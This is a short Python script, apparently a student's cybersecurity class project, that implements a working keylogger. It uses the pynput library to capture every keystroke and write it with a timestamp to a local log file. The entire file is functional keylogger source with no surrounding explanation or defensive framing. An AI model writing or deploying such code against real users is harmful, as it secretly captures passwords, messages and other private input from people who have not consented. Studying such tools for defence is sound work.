import pynput
from pynput.keyboard import Key, Listener
import logging

log_dir = r"C:\Users\reeha\OneDrive\Desktop\SEM-4\Cyber projects\keylogger"
logging.basicConfig(filename = (log_dir + "keylogger.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
   logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
